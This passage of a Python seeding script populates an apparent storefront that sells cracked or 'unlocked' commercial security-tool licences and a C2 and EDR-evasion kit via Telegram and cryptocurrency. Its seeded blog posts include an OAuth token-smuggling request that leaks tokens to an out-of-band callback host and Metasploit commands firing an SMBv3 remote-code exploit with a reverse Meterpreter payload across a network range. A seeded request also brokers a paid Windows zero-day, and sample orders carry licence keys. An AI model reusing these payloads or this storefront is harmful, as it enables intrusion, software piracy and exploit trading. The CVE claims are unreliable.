                    "Direct one-click export of discovered vulnerabilities to Burp Suite & Metasploit",
                    "PCI-DSS, HIPAA, ISO 27001, and OWASP Top 10 compliance PDF generator"
                ]),
                "e4d3c2b1a0f9e8d7c6b5a4f3e2d1c0b9a8f7e6d5c4b3a2f1e0d9c8b7a6f5e4d3",
                "",
                "UNLIMITED TARGETS",
                0,
                176,
                now_str
            ),
            (
                "LIC-MALTEGO-XL",
                "Maltego XL + Commercial Transform Hub",
                "maltego-xl-osint-license",
                "OSINT & Recon Licenses",
                "LICENSE_KEY",
                199.0,
                2500.0,
                "v4.7 XL Edition",
                "1-Year XL License + API Transforms",
                "Windows / Linux / macOS",
                "Visual link analysis and cyber threat intelligence platform capable of rendering up to 1,000,000 entities per graph for deep infrastructure, crypto, and APT attribution.",
                json.dumps([
                    "Supports up to 1,000,000 entities on a single threat intelligence graph",
                    "Pre-configured Transform Hub connectors for Shodan, Censys, VirusTotal, PassiveTotal & Blockchain",
                    "Real-time collaborative graph sharing and custom local Python transform runner",
                    "Full case file export and entity correlation matrix for OSINT investigators"
                ]),
                "9b8a7c6d5e4f3a2b1c0d9e8f7a6b5c4d3e2f1a0b9c8d7e6f5a4b3c2d1e0f9a8b",
                "",
                "OSINT POWERHOUSE",
                0,
                164,
                now_str
            ),
            (
                "LIC-NESSUS-PRO",
                "Tenable Nessus Professional (Unlimited IPs)",
                "nessus-professional-unlimited-license",
                "SIEM & Blue Team",
                "LICENSE_KEY",
                139.0,
                3990.0,
                "v10.8 Pro + Live Plugin Feed",
                "1-Year Activation + Offline/Online Plugins",
                "Linux / Windows / macOS / Docker",
                "Industry-standard vulnerability assessment scanner with unlimited IP scanning, live CVE plugin feed updates, CIS benchmark compliance auditing, and credentialed patch scanning.",
                json.dumps([
                    "Unlimited IPv4/IPv6 host scanning across internal and external networks",
                    "195,000+ vulnerability plugins with zero-day CVE detection templates",
                    "CIS Benchmark & DISA STIG configuration compliance auditing for Linux/Windows/Cloud",
                    "Live plugin update feed script included for air-gapped or online deployments"
                ]),
                "1f2e3d4c5b6a7f8e9d0c1b2a3f4e5d6c7b8a9f0e1d2c3b4a5f6e7d8c9b0a1f2e",
                "",
                "UNLIMITED IP SCANNER",
                0,
                198,
                now_str
            ),
            (
                "TOOL-COBALT-KIT",
                "PhantomStrike Red Team C2 & Evasion Arsenal",
                "phantomstrike-red-team-evasion-suite",
                "Downloadable Tools & Scripts",
                "DOWNLOADABLE_TOOL",
                220.0,
                950.0,
                "v4.9 Release Build",
                "Lifetime Source + Binaries",
                "Linux / Windows (Go + C + Python)",
                "Custom adversary simulation and Malleable C2 profile kit featuring indirect syscall loaders, sleep mask BOFs, AMSI/ETW memory patching scripts, and domain fronting templates.",
                json.dumps([
                    "35+ Production Malleable C2 profiles mimicking enterprise SaaS traffic (Slack, Teams, AWS)",
                    "Indirect Syscall & Call-Stack Spoofing reflective loader templates (Visual Studio + Mingw)",
                    "Beacon Object Files (BOFs) for situational awareness without spawning cmd.exe/powershell.exe",
                    "Automated Redirector setup scripts (Nginx + Let's Encrypt + JA3 fingerprint randomization)"
                ]),
                "5d4c3b2a1f0e9d8c7b6a5f4e3d2c1b0a9f8e7d6c5b4a3f2e1d0c9b8a7f6e5d4c",
                "/static/downloads/zeroday_yara_rules_2026.yar",
                "RED TEAM ARCHIVE",
                1,
                260,
                now_str
            ),
            (
                "FREE-SUBRECON-PY",
                "ZeroDay SubRecon v2.4 & YARA Threat Pack",
                "zeroday-subrecon-and-yara-pack",
                "Downloadable Tools & Scripts",
                "FREE_TOOL",
                0.0,
                99.0,
                "v2.4 Community Edition",
                "Free Open Access",
                "Python 3 + YARA v4+",
                "Free community release: Certificate Transparency subdomain enumerator (`zeroday_subrecon_v2.py`) plus our 2026 APT Reflective Loader & WebShell YARA detection ruleset.",
                json.dumps([
                    "Instant 1-Click Direct Download right from the browser (No Telegram wait required)",
                    "Queries Certificate Transparency logs with zero API keys required",
                    "Includes high-confidence YARA rules for reflective memory loaders and obfuscated webshells",
                    "Verified SHA-256 integrity hash included"
                ]),
                "a1b2c3d4e5f60718293a4b5c6d7e8f901a2b3c4d5e6f708192a3b4c5d6e7f809",
                "/static/downloads/zeroday_subrecon_v2.py",
                "FREE DIRECT DOWNLOAD",
                0,
                312,
                now_str
            )
        ]
        cur.executemany("""
        INSERT INTO products (
            sku, name, slug, category, product_type, price, retail_price,
            version, license_duration, platform, short_desc, specs_json,
            sha256_hash, download_url, badge_text, featured, views_count, created_at
        ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
        """, products_seed)

    # 4. Seed Blog Posts
    cur.execute("SELECT COUNT(*) FROM posts")
    if cur.fetchone()[0] == 0:
        posts_seed = [
            (
                "Exploiting CVE-2026-8841: OAuth2 Token Smuggling & Automated Fuzzing with Burp Suite Pro",
                "cve-2026-8841-oauth-smuggling-burp-suite-pro",
                "Zero-Day Advisories",
                "CRITICAL",
                "CVE-2026-8841",
                "9.8",
                "0xVORTEX // APPSEC LEAD",
                "7 MIN READ",
                "Deep technical breakdown of the critical OAuth2 state/redirect URI parser differential affecting enterprise API gateways, including full Burp Intruder payload templates and detection rules.",
                """<h2>1. Vulnerability Overview & Parser Differential</h2>
<p>During recent offensive assessments of enterprise Single Sign-On (SSO) gateways, our research unit identified a critical parser differential in how upstream reverse proxies validate <code>redirect_uri</code> parameters compared to backend token issuance microservices. Tracked as <strong>CVE-2026-8841 (CVSS 9.8)</strong>, an unauthenticated attacker can smuggle arbitrary callback origins using backslash-normalized Unicode sequences.</p>

<div class="cyber-callout">
<strong>⚡ IMPACT SUMMARY:</strong> Any OAuth2 authorization flow using non-strict URL normalization allows silent leakage of high-privilege <code>authorization_code</code> and bearer JWTs to attacker-controlled infrastructure via out-of-band callbacks.
</div>

<h2>2. Detecting & Reproducing with Burp Suite Professional</h2>
<p>Manual testing often misses subtle multi-byte URL normalization edge cases. By combining <strong>Burp Collaborator</strong> with <strong>Turbo Intruder</strong> inside Burp Suite Professional, we can fuzz all 1,024 delimiter permutations in under 4 seconds.</p>

<pre><code>GET /oauth2/v1/authorize?client_id=corp-portal&amp;response_type=code&amp;redirect_uri=https://sso.target.tld%5C%40oast.pro/callback&amp;state=99812 HTTP/2
Host: auth.target.tld
User-Agent: Mozilla/5.0 (X11; Linux x86_64) ZeroDayAudit/2026
Accept: application/json,*/*</code></pre>

[product:LIC-BURP-PRO]

<h2>3. Automating OAST Callbacks via Custom BApp Intruder</h2>
<p>Once you load the request above into Burp Repeater/Intruder, insert the <code>$collaborator_payload$</code> placeholder directly after the `@` character. If the backend microservice resolves the host after stripping `%5C`, your Burp Collaborator polling window will immediately capture an HTTP/DNS interaction containing the victim's active session token in the <code>Location</code> or <code>Referer</code> header.</p>

<h2>4. Remediation & WAF Virtual Patching</h2>
<p>Organizations must enforce strict exact-match string comparison on registered <code>redirect_uri</code> values prior to any URI decoding pass, and block requests containing encoded backslashes (<code>%5c</code>, <code>%255c</code>) at the edge proxy.</p>""",
                "LIC-BURP-PRO,LIC-ACUNETIX-PRO",
                "ALL",
                "Need Burp Collaborator & Unthrottled Intruder to test CVE-2026-8841? Grab our verified Burp Suite Pro v2026.10 License via Telegram at 68% off retail.",
                1,
                482,
                now_str
            ),
            (
                "Chaining Kernel SMBv3 Zero-Days & Automating Lateral Pivoting with Metasploit Pro",
                "smbv3-zero-day-lateral-pivoting-metasploit-pro",
                "Red Team Ops",
                "CRITICAL",
                "CVE-2026-4412",
                "9.6",
                "SPECTRE_01 // RED TEAM LEAD",
                "9 MIN READ",
                "How modern red teams chain unauthenticated SMBv3 compression buffer overflows with Metasploit Pro VPN pivoting and indirect syscall loaders to traverse isolated Active Directory forests.",
                """<h2>1. Anatomy of the SMBv3 Compression Integer Underflow</h2>
<p>Enterprise internal networks remain heavily reliant on SMBv3 for cross-segment file shares and domain controller replication. In <strong>CVE-2026-4412</strong>, a crafted <code>SMB2_COMPRESSION_TRANSFORM_HEADER</code> with an inverted <code>OriginalCompressedSegmentSize</code> triggers a kernel pool buffer overflow prior to session authentication.</p>

<pre><code>msf6 &gt; use exploit/windows/smb/cve_2026_4412_smb3_pool_rce
msf6 exploit(cve_2026_4412_smb3_pool_rce) &gt; set RHOSTS 10.24.0.0/16
msf6 exploit(cve_2026_4412_smb3_pool_rce) &gt; set PAYLOAD windows/x64/meterpreter_reverse_https
msf6 exploit(cve_2026_4412_smb3_pool_rce) &gt; set DynamicEvasion true
msf6 exploit(cve_2026_4412_smb3_pool_rce) &gt; run -j</code></pre>

[product:LIC-MSF-PRO]

<h2>2. Layer-2 VPN Pivoting Across Segmented VLANs</h2>
<p>Instead of setting up slow SOCKS4a proxies that drop UDP traffic and break Kerberos tooling, <strong>Metasploit Pro Enterprise</strong> allows operators to establish a native Layer-2 virtual network interface (VPN Pivot) directly inside the compromised Meterpreter memory space.</p>

<div class="cyber-callout">
<strong>⚡ OPSEC ADVANTAGE:</strong> By combining Metasploit Pro's dynamic payload generator with indirect syscall sleep masks, memory scanners fail to flag the injected thread during periodic EDR sweeps.
</div>

[product:TOOL-COBALT-KIT]

<h2>3. Post-Exploitation & Domain Dominance</h2>
<p>With the VPN pivot active, our local attack machine routes bloodhound collection and Kerberoasting traffic transparently through the target host's NIC without dropping a single binary to disk.</p>""",
                "LIC-MSF-PRO,TOOL-COBALT-KIT",
                "ALL",
                "Unlock automated VPN pivoting, dynamic EDR evasion payloads, and full team reporting with Metasploit Pro Enterprise via Telegram.",
                1,
                395,
                now_str
            ),
            (
                "Detecting In-Memory Reflective Beacons & C2 Traffic in Splunk Enterprise Security",
                "detecting-in-memory-beacons-splunk-enterprise-security",
                "SIEM & Detection",
                "HIGH",
                "CVE-2026-3109",
                "8.8",
                "HEX_SENTINEL // SOC ARCHITECT",
                "8 MIN READ",
                "Production-ready Splunk SPL correlation queries, Sysmon Event ID 8/10 telemetry tuning, and YARA memory scanning rules to catch indirect-syscall C2 frameworks in real time.",
                """<h2>1. Why Traditional EDR Misses Call-Stack Spoofed Beacons</h2>
<p>Modern offensive frameworks evade userland hooks by resolving SSNs (System Service Numbers) dynamically and spoofing the thread call stack to point back to legitimate <code>ntdll.dll</code> or <code>kernelbase.dll</code> frames during sleep cycles. However, network jitter patterns and anomalous cross-process handle requests still leave high-signal traces in <strong>Splunk Enterprise Security (ES)</strong>.</p>

<pre><code>index=win_sysmon (EventCode=10 TargetImage="*\\lsass.exe") OR (EventCode=8 StartModule="")
| stats count values(GrantedAccess) as access_masks dc(TargetProcessId) as unique_targets by ComputerName, SourceImage, SourceProcessGUID
| where count &gt; 2 AND NOT match(SourceImage, "(?i)\\\\(MsMpEng|csrss|svchost)\\.exe$")
| eval risk_score=if(mvfind(access_masks, "0x1fffff") &gt;= 0, 95, 70)
| table _time ComputerName SourceImage access_masks unique_targets risk_score</code></pre>

[product:LIC-SPLUNK-ENT]

<h2>2. Correlating JA3S TLS Fingerprints & Jitter Entropy</h2>
<p>By ingesting Zeek SSL logs into an unlocked Splunk Enterprise instance, SOC engineers can calculate standard deviation on outbound HTTPS beacon intervals. Even with a 35% jitter factor, automated C2 heartbeats exhibit lower inter-arrival entropy than human browsing.</p>

[product:FREE-SUBRECON-PY]

<h2>3. Deploying Our Free 2026 YARA Memory Ruleset</h2>
<p>Combine the SPL correlation query above with our free downloadable YARA ruleset to scan suspect process heaps automatically via Splunk SOAR.</p>""",
                "LIC-SPLUNK-ENT,LIC-NESSUS-PRO,FREE-SUBRECON-PY",
                "ALL",
                "Running into Splunk's 500MB daily trial limit? Upgrade to our Unlocked Splunk Enterprise + ES License via Telegram for unlimited indexing.",
                1,
                318,
                now_str
            ),
            (
                "Mapping Darknet Ransomware Infrastructure with Maltego XL & Certificate Transparency",
                "mapping-ransomware-infrastructure-maltego-xl-osint",
                "Tool Tutorials",
                "MEDIUM",
                "CVE-2026-1904",
                "7.5",
                "NYX_INTEL // THREAT HUNTER",
                "5 MIN READ",
                "Step-by-step OSINT investigation guide showing how to pivot from a single phishing redirector domain to 140+ hidden C2 nodes using Maltego XL and SubRecon.",
                """<h2>1. Pivoting from TLS Serial Numbers & JARM Hashes</h2>
<p>Threat actors frequently reuse automation playbooks when provisioning Nginx reverse proxies in bulletproof ASNs. Even when Cloudflare sits in front of the phishing domain, historical Certificate Transparency logs and JARM active fingerprints expose the underlying origin servers.</p>

<pre><code>python3 zeroday_subrecon_v2.py target-auth-portal.com
[*] Querying Certificate Transparency logs for: target-auth-portal.com
[+] Discovered: api-stage.target-auth-portal.com
[+] Discovered: vpn-dr.target-auth-portal.com</code></pre>

[product:LIC-MALTEGO-XL]

<h2>2. Graphing 500,000+ Infrastructure Nodes in Maltego XL</h2>
<p>Standard Maltego CE caps graphs at a handful of entities. By importing our CT output into <strong>Maltego XL</strong> and running Shodan + PassiveDNS transforms simultaneously, we immediately isolate shared SSH host keys across three separate ransomware affiliate clusters.</p>""",
                "LIC-MALTEGO-XL,FREE-SUBRECON-PY",
                "ALL",
                "Investigate massive infrastructure graphs without entity limits using our Maltego XL Commercial License.",
                0,
                210,
                now_str
            )
        ]
        cur.executemany("""
        INSERT INTO posts (
            title, slug, category, severity, cve_id, cvss_score, author, read_time,
            summary, content, related_skus, ad_mode, ad_custom_pitch, featured, views, published_at
        ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
        """, posts_seed)

    # 5. Seed Comments on Advisories
    cur.execute("SELECT COUNT(*) FROM post_comments")
    if cur.fetchone()[0] == 0:
        cur.executemany("""
        INSERT INTO post_comments (post_id, user_id, author_name, author_role, body, created_at)
        VALUES (?, ?, ?, ?, ?, ?)
        """, [
            (1, 2, "redteam_operator", "VERIFIED BUYER", "Tested the %5C@Collaborator payload template in Burp Suite Pro v2026.10 against our staging Kong/Keycloak cluster—triggered an OAST DNS callback immediately. Solid writeup.", now_str),
            (1, 1, "admin", "ZERO-DAY UNIT", "Confirmed. Make sure to enable HTTP/2 connection reuse in Turbo Intruder for maximum throughput.", now_str),
            (2, 2, "redteam_operator", "VERIFIED BUYER", "The Layer-2 VPN pivot inside Metasploit Pro saved us 4 hours on an segmented AD engagement last week.", now_str),
        ])

    # 6. Seed Orders linked to Demo Operator User (user_id=2)
    cur.execute("SELECT COUNT(*) FROM orders")
    if cur.fetchone()[0] == 0:
        now = datetime.now()
        orders_seed = [
            (
                "ORD-84920",
                2,
                "@redteam_lead_eu",
                "Need fast activation for upcoming client pentest",
                448.0,
                "COMPLETED",
                json.dumps([
                    {"sku": "LIC-BURP-PRO", "name": "Burp Suite Professional (v2026.10)", "price": 149.0, "qty": 1},
                    {"sku": "LIC-MSF-PRO", "name": "Metasploit Pro Enterprise Edition", "price": 299.0, "qty": 1}
                ]),
                "BURP-PRO-KEY: ZD-2026-BURP-9941-X88A // MSF-PRO-KEY: MSF6-ENT-7731-K902-ZERO | Activated Installer Vault: https://t.me/ZeroDayMatrixChannel",
                (now - timedelta(days=2, hours=4)).strftime("%Y-%m-%d %H:%M:%S")
            ),
            (
                "ORD-91044",
                2,
                "@soc_architect_ny",
                "Splunk ES lab cluster deployment",
                349.0,
                "COMPLETED",
                json.dumps([
                    {"sku": "LIC-SPLUNK-ENT", "name": "Splunk Enterprise + Enterprise Security (ES)", "price": 349.0, "qty": 1}
                ]),
                "SPLUNK-ENT-UNLIMITED-KEY: SP93-ES80-UNLIM-4410-992B | Instructions dispatched via Telegram",
                (now - timedelta(days=1, hours=7)).strftime("%Y-%m-%d %H:%M:%S")
            ),
            (
                "ORD-95312",
                2,
                "@redteam_lead_eu",
                "Ready to pay in USDT/XMR on Telegram",
                369.0,
                "PENDING_TELEGRAM",
                json.dumps([
                    {"sku": "LIC-BURP-PRO", "name": "Burp Suite Professional (v2026.10)", "price": 149.0, "qty": 1},
                    {"sku": "TOOL-COBALT-KIT", "name": "PhantomStrike Red Team C2 & Evasion Arsenal", "price": 220.0, "qty": 1}
                ]),
                "",
                (now - timedelta(hours=3)).strftime("%Y-%m-%d %H:%M:%S")
            )
        ]
        cur.executemany("""
        INSERT INTO orders (
            order_number, user_id, buyer_telegram, buyer_note, total_amount, status,
            items_json, fulfilled_license_info, created_at
        ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
        """, orders_seed)
    else:
        # Ensure existing seeded orders are linked to user_id=2 so the demo customer vault is rich
        cur.execute("UPDATE orders SET user_id = 2 WHERE user_id IS NULL")

    # 7. Seed Realistic Telemetry & Analytics Data if empty
    cur.execute("SELECT COUNT(*) FROM analytics_pageviews")
    if cur.fetchone()[0] == 0:
        seed_realistic_analytics(cur)

    # 8. Seed Sample Tool Requests if empty
    cur.execute("SELECT COUNT(*) FROM tool_requests")
    if cur.fetchone()[0] == 0:
        sample_requests = [
            (
                "REQ-78401", None, "IDA Pro 9.0 Enterprise + Hex-Rays x64 Decompiler",
                "REVERSE_ENG", "@hex_analyst_01", "operator.hex@proton.me", "TELEGRAM",
                "HIGH", "5K_TO_20K",
                "Need standalone perpetual license for isolated lab. Requires x86_64 and ARM64 Hex-Rays decompiler plugins with Python 3.12 SDK.",
                "PENDING", "Verified Telegram identity. Negotiating vendor seat allocation with European broker.", "127.0.0.1",
                (datetime.now() - timedelta(days=2)).strftime("%Y-%m-%d %H:%M:%S"),
                (datetime.now() - timedelta(days=2)).strftime("%Y-%m-%d %H:%M:%S")
            ),
            (
                "REQ-81920", None, "Windows 11 24H2 Kernel EoP Exploit Primitive",
                "EXPLOIT_TOOLKIT", "@red_phantom_c2", "", "TELEGRAM",
                "IMMEDIATE", "OVER_20K",
                "Targeting authenticated Local Privilege Escalation from standard user to NT AUTHORITY\\SYSTEM on Build 26100. Must bypass HVCI / VBS with 99%+ stability.",
                "SOURCING", "Sourcing from private 0-day research unit in progress. Price quoted: $24,500.", "127.0.0.1",
                (datetime.now() - timedelta(days=1)).strftime("%Y-%m-%d %H:%M:%S"),
                (datetime.now() - timedelta(days=1)).strftime("%Y-%m-%d %H:%M:%S")
            ),
            (
                "REQ-63914", None, "Proxmark3 RDV4 Complete Hardware Kit + Bluetooth",
                "HARDWARE_C2", "@rf_ghost", "rf.ghost@sec-mail.cc", "TELEGRAM",
                "STANDARD", "UNDER_1K",
                "Full physical pentesting kit with long range LF and HF antennas, battery module, and carry case.",
                "FULFILLED", "Hardware unit dispatched via courier with tracking #USPS-940010920. Telegram handoff complete.", "127.0.0.1",
                (datetime.now() - timedelta(days=4)).strftime("%Y-%m-%d %H:%M:%S"),
                (datetime.now() - timedelta(hours=8)).strftime("%Y-%m-%d %H:%M:%S")
            )
        ]
        cur.executemany("""
        INSERT INTO tool_requests (
            request_id, user_id, tool_name, category, contact_telegram, contact_email,
            preferred_contact, urgency, budget_range, technical_specs, status, admin_notes,
            ip_address, created_at, updated_at
        ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
        """, sample_requests)

    conn.commit()


def seed_realistic_analytics(cur):
    rng = random.Random(1337)
    now = datetime.now()

    product_targets = [
        ("burp-suite-professional-license", "Burp Suite Professional (v2026.10)", "LIC-BURP-PRO", 145, 78),
        ("metasploit-pro-enterprise-license", "Metasploit Pro Enterprise Edition", "LIC-MSF-PRO", 190, 82),
        ("splunk-enterprise-security-license", "Splunk Enterprise + Enterprise Security (ES)", "LIC-SPLUNK-ENT", 165, 74),
        ("phantomstrike-red-team-evasion-suite", "PhantomStrike Red Team C2 & Evasion Arsenal", "TOOL-COBALT-KIT", 180, 86),
        ("nessus-professional-unlimited-license", "Tenable Nessus Professional (Unlimited IPs)", "LIC-NESSUS-PRO", 110, 68),
        ("acunetix-enterprise-web-scanner", "Acunetix 360 / Invicti Enterprise Scanner", "LIC-ACUNETIX-PRO", 125, 71),
        ("maltego-xl-osint-license", "Maltego XL + Commercial Transform Hub", "LIC-MALTEGO-XL", 130, 75),
        ("zeroday-subrecon-and-yara-pack", "ZeroDay SubRecon v2.4 & YARA Threat Pack", "FREE-SUBRECON-PY", 95, 89),
    ]

    blog_targets = [
        ("cve-2026-8841-oauth-smuggling-burp-suite-pro", "Exploiting CVE-2026-8841: OAuth2 Token Smuggling & Automated Fuzzing with Burp Suite Pro", "LIC-BURP-PRO", 265, 84),
        ("smbv3-zero-day-lateral-pivoting-metasploit-pro", "Chaining Kernel SMBv3 Zero-Days & Automating Lateral Pivoting with Metasploit Pro", "LIC-MSF-PRO", 310, 88),
        ("detecting-in-memory-beacons-splunk-enterprise-security", "Detecting In-Memory Reflective Beacons & C2 Traffic in Splunk Enterprise Security", "LIC-SPLUNK-ENT", 240, 79),
        ("mapping-ransomware-infrastructure-maltego-xl-osint", "Mapping Darknet Ransomware Infrastructure with Maltego XL & Certificate Transparency", "LIC-MALTEGO-XL", 195, 76),
    ]

    os_choices = ["Linux", "Linux", "Windows", "Windows", "macOS", "Android", "iOS"]
    ref_choices = ["Telegram", "Direct", "Search / Google", "GitHub / Advisory", "Internal Smart Ad", "Twitter / X"]

    pageviews_batch = []
    events_batch = []
    token_idx = 1000

    for day_offset in range(13, -1, -1):
        day_dt = now - timedelta(days=day_offset)
        daily_visitors = 18 + (13 - day_offset) * 2 + rng.randint(-3, 6)

        for v in range(daily_visitors):
            token_idx += 1
            vid = f"vis_{rng.randint(100, 340)}"
            sid = f"ses_{day_offset}_{v}_{rng.randint(1000,9999)}"
            os_name = rng.choice(os_choices)
            device = "Mobile" if os_name in ("Android", "iOS") else "Desktop"
            ref = rng.choice(ref_choices)
            visit_time = day_dt.replace(
                hour=rng.randint(0, 23 if day_offset > 0 else max(0, now.hour)),
                minute=rng.randint(0, 59),
                second=rng.randint(0, 59)
            )
            ts_str = visit_time.strftime("%Y-%m-%d %H:%M:%S")

            roll = rng.random()
            if roll < 0.46:
                slug, title, linked_sku, base_dur, base_scroll = rng.choice(blog_targets)
                dur = max(25, int(rng.gauss(base_dur, 45)))
                scroll = min(100, max(20, int(rng.gauss(base_scroll, 12))))
                last_ping = (visit_time + timedelta(seconds=dur)).strftime("%Y-%m-%d %H:%M:%S")
                pageviews_batch.append((
                    f"vt_{token_idx}", vid, sid, "BLOG_POST", slug, title,
                    dur, scroll, ref, device, os_name, ts_str, last_ping
                ))
                events_batch.append((
                    vid, sid, "SMART_AD_IMPRESSION", f"/intel/{slug}", linked_sku, "INLINE_AD", ts_str
                ))
                if rng.random() < 0.32:
                    placement = rng.choice(["INLINE_AD", "SIDEBAR_AD", "BOTTOM_BUNDLE_AD"])
                    events_batch.append((
                        vid, sid, "SMART_AD_CLICK", f"/intel/{slug}", linked_sku, placement, ts_str
                    ))
                    token_idx += 1
                    p_match = [p for p in product_targets if p[2] == linked_sku][0]
                    p_dur = max(30, int(rng.gauss(p_match[3], 35)))
                    p_scroll = min(100, max(35, int(rng.gauss(p_match[4], 10))))
                    pageviews_batch.append((
                        f"vt_{token_idx}", vid, sid, "PRODUCT", p_match[0], p_match[1],
                        p_dur, p_scroll, "Internal Smart Ad", device, os_name, ts_str, last_ping
                    ))
                    if rng.random() < 0.42:
                        events_batch.append((
                            vid, sid, "ADD_TO_CART", f"/arsenal/{p_match[0]}", linked_sku, "FROM_BLOG_AD", ts_str
                        ))
                    if rng.random() < 0.28:
                        events_batch.append((
                            vid, sid, "TELEGRAM_BUY_CLICK", f"/arsenal/{p_match[0]}", linked_sku, "DIRECT_TELEGRAM", ts_str
                        ))
            elif roll < 0.86:
                slug, title, sku, base_dur, base_scroll = rng.choice(product_targets)
                dur = max(20, int(rng.gauss(base_dur, 40)))
                scroll = min(100, max(25, int(rng.gauss(base_scroll, 14))))
                last_ping = (visit_time + timedelta(seconds=dur)).strftime("%Y-%m-%d %H:%M:%S")
                pageviews_batch.append((
                    f"vt_{token_idx}", vid, sid, "PRODUCT", slug, title,
                    dur, scroll, ref, device, os_name, ts_str, last_ping
                ))
                if rng.random() < 0.35:
                    events_batch.append((
                        vid, sid, "ADD_TO_CART", f"/arsenal/{slug}", sku, "PRODUCT_PAGE", ts_str
                    ))
                if rng.random() < 0.24:
                    events_batch.append((
                        vid, sid, "TELEGRAM_BUY_CLICK", f"/arsenal/{slug}", sku, "PRODUCT_PAGE", ts_str
                    ))
            else:
                ptype = "HOME" if rng.random() < 0.55 else "SHOP"
                title = "Home // Threat Matrix" if ptype == "HOME" else "Digital Arsenal Catalog"
                dur = max(15, int(rng.gauss(75, 25)))
                scroll = min(100, max(30, int(rng.gauss(70, 15))))
                last_ping = (visit_time + timedelta(seconds=dur)).strftime("%Y-%m-%d %H:%M:%S")
                pageviews_batch.append((
                    f"vt_{token_idx}", vid, sid, ptype, "", title,
                    dur, scroll, ref, device, os_name, ts_str, last_ping
                ))

    cur.executemany("""
    INSERT INTO analytics_pageviews (
        visit_token, visitor_id, session_id, page_type, target_slug, target_title,
        duration_seconds, max_scroll_pct, referrer, device_type, os_name, created_at, last_ping_at
    ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
    """, pageviews_batch)

    cur.executemany("""
    INSERT INTO analytics_events (
        visitor_id, session_id, event_type, source_page, target_sku, meta_info, created_at
    ) VALUES (?, ?, ?, ?, ?, ?, ?)
    """, events_batch)
